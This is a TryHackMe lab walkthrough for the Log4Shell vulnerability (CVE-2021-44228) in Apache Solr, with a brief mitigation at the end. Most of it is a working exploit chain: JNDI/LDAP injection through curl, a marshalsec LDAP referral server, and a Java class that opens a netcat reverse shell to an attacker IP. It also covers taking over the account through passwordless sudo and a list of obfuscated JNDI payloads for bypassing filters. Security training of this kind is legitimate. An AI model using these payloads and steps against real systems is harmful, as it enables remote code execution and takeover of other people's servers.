# Try Hack Me Room Sonar/Log4j

### Overview

On December 9, 2021, a new vulnerability identified as CVE-2021-44228, affects the Java logger. This vulnerability could cause remote code execution on servers using this java version. This attack has been dubbed "Log4Shell".

Today, version  is available and patches this vulnerability (JNDI is fully disabled, support for Message Lookups is removed, and the new DoS vulnerability CVE-2021-45046 is not present)
([Github]( https://github.com/apache/logging-log4j2/releases/tag/rel%2F2.16.0))

Now we also practice learning about this vulnerability through [TryHackMe](https://tryhackme.com/room/solar)

### Reconnaissance

First we will use the scout tool `nmap` to see which ports are active on the target IP address.
> nmap -v -p- MACHINE_IP

For the question in this section ask which service on port `8983`:
> nmap -sV MACHINE_IP -p 8983

![image](https://user-images.githubusercontent.com/63194321/146513602-5fbaed8a-14f2-4ef3-82f9-59eb8e1c3b29.png)

You can see the service running on port 8983 is `Apache Solr`

### Discovery

The target machine is running Apache Solr on port 8983 so we can visit the website on the browser by going to:
> http://MACHINE_IP:8983

![image](https://user-images.githubusercontent.com/63194321/146521115-70e7cc91-a2b9-46dd-9753-52d34b7f42e6.png)

* To answer the question of what the `-Dsolr.log.dir` argument is set to, we go to the website `http://MACHINE_IP:8983` and find that argument:
  ![image](https://user-images.githubusercontent.com/63194321/146524771-c5505016-b518-419d-85ee-23d38e0ae84c.png)

To answer the following questions we have to download the previously recorded web `log` files.

![image](https://user-images.githubusercontent.com/63194321/146526887-212b9a07-9da4-4b86-9a08-bfbec3ad6db8.png)

* We use `cat xxx | grep INFO` to open the downloaded files and identify the result as `solr.log`.

  ![image](https://user-images.githubusercontent.com/63194321/146527382-2449ea2c-2636-4d54-9bda-dcd968fbe8eb.png)

* Also in this file we can also answer the questions `path endpoint` and `entrypoint that you as a user could control`:
  > path=/admin/cores
  
  > params

  ![image](https://user-images.githubusercontent.com/63194321/146547293-ac803ea3-3e95-4ade-bb1d-ed254a581775.png)

### Proof of Concept


From the log file above we can see that the vectors for the attack are `params` variables.

The log4j package adds extra logic to logs by "parsing" entries, ultimately to enrich the data -- but may additionally take actions and even evaluate code based off the entry data. This is the gist of CVE-2021-44228. Other syntax might be in fact executed just as it is entered into log files. 

Some examples:
* ${sys:os.name}
* ${sys:user.name}
* ${log4j:configParentLocation}
* ${ENV:PATH}
* ${ENV:HOSTNAME}
* ${java:version}

The usual format that can be exploited to attack the vulnerability is: `${jndi:ldap://ATTACKERCONTROLLEDHOST}`.
This syntax indicates that the log4j will invoke functionality from "JNDI", or the "Java Naming and Directory Interface." Ultimately, this can be used to access external resources, or "references," which is what is weaponized in this attack.


This means that the user will continue to use a terminal that the attacker controls through the `LDAP` (Lightweight Directory Access Protocol).

**But there is a question where to enter the attack syntax?**
  
**The answer is: Anywhere that has data logged by the application.**

It is difficult to determine the attack surface of the vulnerability. So we will rely on the presence of log4j files in the system to determine.

Locations that can be used to inject payloads:
* Input boxes, user and password login forms, data entry points within applications
* HTTP headers such as , , or other customizable headers `User-Agent`, `X-Forwarded-For`
* Any place for user-supplied data

**To complete the questions in this section we can do the following:**

First we will define our ip address.
> ip addr show

![image](https://user-images.githubusercontent.com/63194321/146552665-28fec267-1e87-4a77-8ccb-e147a85457cd.png)

Next we will create a listener on port 4444.
> nc -lvnp 4444

![image](https://user-images.githubusercontent.com/63194321/146552783-9f4f25ba-cd82-4157-8d0a-b65862abd609.png)

Use `curl` to access the web page open on port 8983 with the path `path`.
> curl 'http://10.10.151.215:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:4444\}'

![image](https://user-images.githubusercontent.com/63194321/146553225-01aca8d1-0ff5-4b6c-9a2a-622f33969f29.png)

* We will pass in a variable which is a common payload to attack `log4j` into the web page.

As soon as `curl` reaches the web page, the listener is able to connect to the web page.

![image](https://user-images.githubusercontent.com/63194321/146553808-f59d5f1b-c03f-41ed-87ed-c33df3c44e45.png)

### Exploitation

At this point, you have verified the target is in fact vulnerable by seeing this connection caught in your listener. However, it made an LDAP request... so all your listener may have seen was non-printable characters (strange looking bytes). 


So what we need to do now is build an `LDAP Referral Server`.

Our activity flow will now look like this.

1. `${jndi:ldap://attackerserver:1389/Resource}` -> reaches out to our LDAP Referral Server
2. LDAP Referral Server springboards the request to a secondary `http://attackerserver/resource`
3. The victim retrieves and executes the code present in `http://attackerserver/resource`

This means we will need an HTTP server, which we could simply host with any of the following options (serving on port 8000).

We will answer the questions in this step as follows:

First build `LDAP Referral Server`:
> git clone https://github.com/mbechler/marshalsec

Build LDAP Referral Server with java maven:
> cd marshalsec

> mvn clean package -DskipTests

![image](https://user-images.githubusercontent.com/63194321/146556263-30706ede-ed1d-4c21-bec3-94b3e8a45767.png)

Next start the LDAP server:
> java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit"

![image](https://user-images.githubusercontent.com/63194321/146556441-04ef860d-03ea-4968-b9ea-c46431cb2ffd.png)

After the LDAP server runs, we will create a piece of java code to execute arbitrary code.

Create a Exploit.java file with the content:
```
public class Exploit {
     static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 4444");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
  } 
```
After saving the file, we will run this file with the syntax.
> javac Exploit.java

After running, we will have 1 more file `Exploit.class`.
![image](https://user-images.githubusercontent.com/63194321/146558060-e9ef861c-1593-42d8-9268-4d9392e1927d.png)


Next, we host this java file through http server.(where the file `exploit.class` . is stored)
> python3 -m http.server
  
  ![image](https://user-images.githubusercontent.com/63194321/146558741-dff5a5cb-7283-46c3-a242-a10d38a24c31.png)


Open Netcat listener on port 4444:
> nc -nvlp 4444

![image](https://user-images.githubusercontent.com/63194321/146559044-f51b59cf-585b-4f31-8c75-1339cca15a64.png)

Finally, all that is left to do is trigger the exploit and fire off our JNDI syntax!
> curl 'http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:1389/Exploit\}'

![image](https://user-images.githubusercontent.com/63194321/146559382-9cfe3124-b854-437c-9817-5b2f974d04f8.png)

Listener on LDAP Referral Server:

![image](https://user-images.githubusercontent.com/63194321/146559446-147737c3-570d-4123-9bcc-adfe4f467212.png)

Netcat listener:

![image](https://user-images.githubusercontent.com/63194321/146559773-1712d573-a1b7-46ce-87c7-a96ca2ff71d5.png)

### Persistence

We can add the following to make the revert shell easier to use.
> python3 -c "import pty; pty.spawn('/bin/bash')"

![image](https://user-images.githubusercontent.com/63194321/146560332-f60840a9-7f9b-4692-aa11-0e98df8cc6ea.png)

Next identify the user with `whoami`

![image](https://user-images.githubusercontent.com/63194321/146560520-2c0d476a-c6d0-42c1-b36b-7f09833e53a6.png)

Define user permissions.
>sudo -l

![image](https://user-images.githubusercontent.com/63194321/146560749-4df304fa-cf1d-4a86-a3e1-efab0f83c6d8.png)


we see here we have all rights without using password so we can change user passwd and access via SSH.
> sudo passwd solr

![image](https://user-images.githubusercontent.com/63194321/146561096-5bdf71d7-3a54-4de4-a108-19dc6f309d02.png)

![image](https://user-images.githubusercontent.com/63194321/146561253-b3722e3b-f151-4c91-b8f7-d0d8f76e23a9.png)

### Detection

After SSHing into the user account, we can locate the log files on the server.

![image](https://user-images.githubusercontent.com/63194321/146561658-22ceb7d8-a89e-40b9-ac10-384df934e561.png)

We can see these log files: 

![image](https://user-images.githubusercontent.com/63194321/146561855-e27dd2d4-00e2-4be2-9d8d-c60fe12bd351.png)

### Bypass

In addition to using the standard `JNDI` payloads you can also modify these to bypass application filters.

* ${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
* ${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
* ${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
* ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
* ${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
* ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
* ${${::-j}ndi:rmi://attackerendpoint.com/}

Note the use of the protocol in the last one. This is also another valid technique that can be used with the utility -- feel free to experiment `rmi://marshalsec`

### Mitigation

To ease this work, you can configure it manually in `solr.in.sh` to prevent listening on the server's LDAP.

By adding the following to the end of the file.
> SOLR_OPTS="$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true" 

You can prevent listening on LDAP servers.

## Thankyou for reading!!!

### References

* https://blog.cloud365.vn/ldap/LDAP-part-1-gioi-thieu-ve-LDAP/
* https://qastack.vn/programming/4365621/what-is-jndi-what-is-its-basic-use-when-is-it-used
* https://tryhackme.com/room/solar



